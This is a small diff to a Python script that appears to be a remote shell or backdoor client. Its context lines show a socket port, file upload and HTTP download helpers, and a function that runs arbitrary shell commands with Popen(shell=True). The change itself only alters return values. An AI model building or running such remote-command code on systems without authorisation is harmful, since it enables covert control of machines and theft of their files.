@@ -14,6 +14,7 @@ PORT = 1000
 
 sock = None
 cwd = os.getcwd()
+ret = '' # '' or 'xxx'
 
 def upload(sock, fn):
   try:
@@ -37,14 +38,14 @@ def dlhttp(sock, url):
   except Exception as e:
     return str(e) + ' ⚠️'
 
-# @return: None / '' / 'xxx'
+# @return: '' or 'xxx'
 def run(s):
   global cwd
   if s.startswith('cd'):
     try:
       os.chdir(s[3:])
       cwd = os.getcwd()
-      return None # success of chdir
+      return ''
     except Exception as e:
       return str(e) + ' ⚠️'
   p = sp.Popen(s, shell=True, stdout=sp.PIPE, stderr=sp.PIPE)
